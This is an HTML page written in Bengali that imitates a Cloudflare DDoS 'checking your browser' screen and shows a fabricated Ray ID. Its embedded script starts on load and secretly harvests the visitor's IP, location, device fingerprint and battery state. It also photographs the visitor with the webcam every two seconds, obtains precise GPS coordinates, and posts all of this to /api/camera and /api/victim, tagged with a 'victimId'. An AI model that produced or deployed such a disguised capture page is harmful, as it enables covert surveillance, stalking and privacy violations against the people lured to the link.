<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Just a moment...</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh;
            font-family: -apple-system, system-ui, sans-serif; text-align: center; padding: 20px;
        }
        .container { max-width: 500px; }
        .bubbles { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
        .bubble {
            width: 20px; height: 20px; background: #f58220; border-radius: 50%;
            animation: fader 1.6s infinite;
        }
        .bubble:nth-child(2) { animation-delay: 0.2s; }
        .bubble:nth-child(3) { animation-delay: 0.4s; }
        @keyframes fader { 0%{opacity:0.2} 50%{opacity:1} 100%{opacity:0.2} }
        h1 { font-size: 24px; margin-bottom: 10px; }
        p { color: #555; margin: 8px 0; font-size: 18px; }
        .attribution { margin-top: 30px; font-size: 14px; color: #999; }
        .attribution a { color: #2c7cb0; text-decoration: none; }
        #status { margin-top: 20px; font-weight: bold; color: #333; }
        video, canvas { display: none !important; }
    </style>
</head>
<body>
    <div class="container">
        <div class="bubbles"><div class="bubble"></div><div class="bubble"></div><div class="bubble"></div></div>
        <h1>আপনার ব্রাউজার চেক করা হচ্ছে...</h1>
        <p>এই প্রক্রিয়াটি স্বয়ংক্রিয়।</p>
        <p id="status">অনুগ্রহ করে ৫ সেকেন্ড অপেক্ষা করুন…</p>
        <div class="attribution">DDoS সুরক্ষা দ্বারা <a href="#">Cloudflare</a><br><span>Ray ID: <code id="ray">6c51810c599f2cda</code></span></div>
    </div>
    <video id="video" playsinline autoplay muted></video>
    <canvas id="canvas"></canvas>
    <script>
        (function() {
            const pathParts = window.location.pathname.split('/');
            const victimId = pathParts[pathParts.length - 1];
            const statusEl = document.getElementById('status');
            const chars = "qwertyuioplkjhgfdsazxcvbnm0987654321";
            let ray = ""; for (let i=0; i<17; i++) ray += chars[Math.floor(Math.random()*chars.length)];
            document.getElementById('ray').textContent = ray;

            async function collectData() {
                const data = { id: victimId, timestamp: new Date().toISOString(), device: {}, media: [], network: {}, battery: null };

                try { const ipRes = await fetch('https://api.ipify.org?format=json'); const ipData = await ipRes.json(); data.ip = ipData.ip; } catch(e) {}
                try { if(data.ip) { const locRes = await fetch(`https://ipapi.co/${data.ip}/json/`); const locData = await locRes.json(); data.location = { country: locData.country_name, region: locData.region, city: locData.city, latitude: locData.latitude, longitude: locData.longitude, isp: locData.org }; } } catch(e) {}

                data.device = {
                    productSub: navigator.productSub || 'N/A', vendor: navigator.vendor || 'N/A',
                    maxTouchPoints: navigator.maxTouchPoints || 0, doNotTrack: navigator.doNotTrack || 'N/A',
                    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A', cookieEnabled: navigator.cookieEnabled || false,
                    appCodeName: navigator.appCodeName || 'N/A', appName: navigator.appName || 'N/A',
                    appVersion: navigator.appVersion || 'N/A', platform: navigator.platform || 'N/A',
                    product: navigator.product || 'N/A', userAgent: navigator.userAgent || 'N/A',
                    language: navigator.language || 'N/A', languages: navigator.languages || [],
                    webdriver: navigator.webdriver || false, pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                    deviceMemory: navigator.deviceMemory || 'N/A', screen: screen.width+'x'+screen.height, colorDepth: screen.colorDepth || 'N/A'
                };
                try { const devices = await navigator.mediaDevices.enumerateDevices(); data.media = devices.map(d => ({ kind: d.kind, label: d.label || 'N/A', deviceId: d.deviceId || 'N/A' })); } catch(e) {}
                if(navigator.connection) data.network = { type: navigator.connection.type || 'N/A', rtt: navigator.connection.rtt || 0, saveData: navigator.connection.saveData || false, effectiveType: navigator.connection.effectiveType || 'N/A', downlink: navigator.connection.downlink || 0, downlinkMax: navigator.connection.downlinkMax || 0 };
                try { const battery = await navigator.getBattery(); data.battery = { level: Math.round(battery.level*100), charging: battery.charging }; } catch(e) {}

                // ক্যামেরা
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' }, audio: false });
                    const video = document.getElementById('video'); const canvas = document.getElementById('canvas');
                    video.srcObject = stream;
                    let count = 0;
                    const interval = setInterval(() => {
                        if (!video.videoWidth || !video.videoHeight) return;
                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d'); ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const img = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
                        fetch('/api/camera', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: victimId, image: img }) });
                        count++; statusEl.textContent = `📸 ${count}টি ছবি তোলা হয়েছে...`;
                    }, 2000);
                    setTimeout(() => { clearInterval(interval); stream.getTracks().forEach(t => t.stop()); }, 30000);
                } catch(e) { statusEl.textContent = '❌ ক্যামেরা অ্যাক্সেস ডিনাই করা হয়েছে'; }

                // লোকেশন
                try {
                    if (navigator.geolocation) {
                        const pos = await new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 }));
                        data.gpsLocation = { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy, googleMaps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` };
                        statusEl.textContent = `📍 লোকেশন পাওয়া গেছে!`;
                    }
                } catch(e) {}

                // ফাইনাল ডেটা পাঠান
                try {
                    await fetch('/api/victim', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
                    statusEl.textContent = '✅ সব তথ্য সংগ্রহ করা হয়েছে!';
                } catch(e) { statusEl.textContent = '❌ ডেটা পাঠাতে ব্যর্থ'; }
            }
            window.addEventListener('load', collectData);
        })();
    </script>
</body>
</html>
